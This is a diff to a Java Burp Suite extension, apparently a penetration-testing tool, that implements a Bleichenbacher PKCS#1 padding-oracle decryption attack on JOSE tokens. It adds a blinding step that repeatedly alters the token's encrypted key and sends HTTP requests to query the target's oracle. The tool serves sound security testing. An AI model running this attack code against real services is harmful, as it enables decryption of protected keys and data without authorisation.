@@ -53,6 +53,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
     private IHttpRequestResponse requestResponse;
     private IParameter parameter;
 
+    private boolean msgIsPkcs = true;
     private BigInteger c0;
     private BigInteger s0;
     private BigInteger si;
@@ -66,7 +67,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
     private byte[] encryptedKey;
     private int amountRequests = 0;
 
-    BleichenbacherPkcs1DecryptionAttackExecutor(BleichenbacherPkcs1DecryptionAttackPanel panelReference, IBurpExtenderCallbacks callbacks, RSAPublicKey pubKey, IHttpRequestResponse requestResponse, IParameter parameter, BleichenbacherPkcs1Oracle oracle) {
+    BleichenbacherPkcs1DecryptionAttackExecutor(BleichenbacherPkcs1DecryptionAttackPanel panelReference, IBurpExtenderCallbacks callbacks, RSAPublicKey pubKey, IHttpRequestResponse requestResponse, IParameter parameter, BleichenbacherPkcs1Oracle oracle, boolean msgIsPkcs) {
         this.panelReference = panelReference;
         this.requestResponse = requestResponse;
         this.parameter = parameter;
@@ -74,6 +75,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         this.helpers = callbacks.getHelpers();
         this.oracle = oracle;
         this.pubKey = pubKey;
+        this.msgIsPkcs = msgIsPkcs;
     }
 
     @Override
@@ -106,10 +108,14 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
 
         loggerInstance.log(getClass(), "Step 1: Blinding", Logger.LogLevel.INFO);
 
-        loggerInstance.log(getClass(), "Step skipped --> " + "Message is considered as PKCS compliant.", Logger.LogLevel.INFO);
-        this.s0 = BigInteger.ONE;
-        this.c0 = new BigInteger( 1, this.encryptedKey );
-        this.m = new Interval[] { new Interval( BigInteger.valueOf( 2 ).multiply( this.bigB ), ( BigInteger.valueOf( 3 ).multiply( this.bigB ) ).subtract( BigInteger.ONE ) ) };
+        if (this.msgIsPkcs) {
+            loggerInstance.log(getClass(), "Step skipped --> " + "Message is considered as PKCS compliant.", Logger.LogLevel.INFO);
+            this.s0 = BigInteger.ONE;
+            this.c0 = new BigInteger( 1, this.encryptedKey );
+            this.m = new Interval[] { new Interval( BigInteger.valueOf( 2 ).multiply( this.bigB ), ( BigInteger.valueOf( 3 ).multiply( this.bigB ) ).subtract( BigInteger.ONE ) ) };
+        } else {
+            stepOne();
+        }
 
         i++;
 
@@ -157,6 +163,42 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         this.panelReference.setAmountRequestsValue(this.amountRequests);
     }
 
+    private void stepOne() throws Exception {
+        byte[] send;
+        IHttpRequestResponse response;
+        byte[] request;
+
+        do {
+            // Check if user has cancelled the worker
+            if (isCancelled()) {
+                loggerInstance.log(getClass(), "Decryption Attack Executor Worker cancelled by user", Logger.LogLevel.INFO);
+                return;
+            }
+
+            this.si = this.si.add( BigInteger.ONE );
+            send = prepareMsg( this.c0, this.si );
+
+            request = this.requestResponse.getRequest();
+            String[] components = joseDecoder.getComponents(this.parameter.getValue());
+            components[1] = joseDecoder.base64UrlEncode(send);
+
+            String newComponentsConcatenated = joseDecoder.concatComponents(components);
+
+            IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
+            request = helpers.updateParameter(request, updatedParameter);
+
+            response = callbacks.makeHttpRequest(this.httpService, request);
+            updateAmountRequest();
+
+        } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
+
+        this.c0 = new BigInteger( 1, send );
+        this.s0 = this.si;
+        // mi = {[2B,3B-1]}
+        this.m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB), (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+
+        loggerInstance.log(getClass(), "Found s0 : " + this.si, Logger.LogLevel.INFO);
+    }
 
     private void stepTwo(final int i) throws Exception {
         if ( i == 1 ) {
